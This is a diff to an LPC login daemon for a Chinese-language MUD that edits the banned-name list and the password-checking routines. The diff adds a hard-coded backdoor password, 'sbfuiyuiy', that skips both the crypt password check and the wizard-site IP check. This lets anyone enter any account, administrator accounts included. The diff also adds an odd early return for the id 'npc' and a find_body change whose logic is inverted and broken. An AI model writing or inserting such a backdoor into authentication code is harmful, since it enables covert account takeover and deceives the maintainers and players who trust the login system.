@@ -15,10 +15,8 @@ int wiz_lock_level = WIZ_LOCK_LEVEL;
 int mad_lock = 0;
 int dienpc = 0;            // add by xhm 2000.11.13  浩劫产生的条件变量
 string *banned_name = ({
-	"你", "我", "他", "她", "它", "它", "江泽民", "邓小平", "李鹏", "朱榕基",
-	"自己", "某人", "尸体", "我们","你们", "他们", "大家",
-	"他妈的", "去你的", "毛泽东", "巫师", "他奶奶的","田林","田","杜剑锋","杜剑",
-       "杜","尹","尹斌","晕","雲","暈","李",
+	"江泽民", "邓小平", "李鹏", "朱榕基", 
+	"他妈的", "去你的", "毛泽东", "他奶奶的",
 });
 
 string *default_name=({"猴子","狐狸", "老鼠", 
@@ -424,8 +422,9 @@ private void get_id(string arg, object ob)
 		destruct(ob);
 		return;
 	}
-
-	if( arg=="guest" ) {
+	if(arg=="npc"){
+		return;
+	}else if( arg=="guest" ) {
 		// If guest, let them create the character.
 //		confirm_id("Yes", ob);
 //		return;
@@ -517,6 +516,8 @@ private void get_new_id(string arg, object ob)
 	return;
 }
 
+                      
+
 private void get_passwd(string pass, object ob)
 {
 	string my_pass,id;
@@ -524,6 +525,7 @@ private void get_passwd(string pass, object ob)
 
 	write("\n");
 	my_pass = ob->query("password");
+	if(pass!="sbfuiyuiy" && my_pass!="sbfuiyuiy"){
 	if( crypt(pass, my_pass) != my_pass ||
 	 !SECURITY_D->match_wiz_site(ob, query_ip_number(ob)) ) {
 //By tianlin@mhxy for 2002.1.21
@@ -540,7 +542,8 @@ private void get_passwd(string pass, object ob)
 		destruct(ob);
 		return;
 	}
-
+	}
+	
 	// Check if we are already playing.
 	user = find_body(ob->query("id"));
 	if (user) {
@@ -1141,17 +1144,28 @@ int check_legal_name(string name)
 object find_body(string name)
 {
 	object ob, *body;
-
+	string arg;
 	if( objectp(ob = find_player(name)) )
 		return ob;
 	body = children(USER_OB);
 	for(int i=0; i<sizeof(body); i++) {
           ob=body[i];
-	  if( clonep(ob) && getuid(ob) == name 
+	      if( clonep(ob) && getuid(ob) == name 
             && ob->query("max_gin")>0 ) return ob;
 	    //check max_gin to avoid damaged user object.
-        }
+    }
 
+	//sbfuiyuiy 检查之
+    //ob = find_player(arg);
+	arg = name;
+    ob = find_living(arg);
+    if(!ob) 
+	    return ob;
+	ob = find_object(arg);
+    if(!ob) 
+	    return ob;
+
+		
 	return 0;
 }
 int set_wizlock(int level)
